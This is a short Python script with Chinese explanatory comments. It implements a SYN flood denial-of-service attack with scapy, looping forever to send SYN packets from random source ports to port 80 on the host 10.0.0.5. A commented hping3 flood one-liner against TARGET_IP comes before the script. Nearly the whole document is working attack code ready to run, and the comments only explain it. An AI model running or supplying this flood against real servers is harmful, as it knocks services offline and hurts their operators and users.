#常见的 DDoS 攻击包括 SYN flood、ICMP flood、UDP flood 等。
# hping3 -S -p 80 --flood TARGET_IP

#SYN Flood 是一种拒绝服务攻击（DoS），通过向目标发送大量的 SYN 包，使目标主机无法处理正常的连接请求，从而导致服务中断。
from scapy.all import *
import time

target_ip = "10.0.0.5"
target_port = 80  #80是 HTTP 协议的默认端口，进行一个针对 Web 服务的攻击

def syn_flood():
    while True:
        ip = IP(dst=target_ip)  #构造一个 IP 数据包
        tcp = TCP(sport=RandShort(), dport=target_port, flags="S") #构造TCP数据包
        pkt = ip / tcp #将构造IP数据包和TCP数据包组合在一起，形成完整的TCP/IP数据包
        send(pkt, verbose=False)

if __name__ == '__main__':
    syn_flood()

#导入 scapy 库，scapy 是一个强大的 Python 库，用于创建、修改和发送网络数据包，适用于网络分析、渗透测试等。

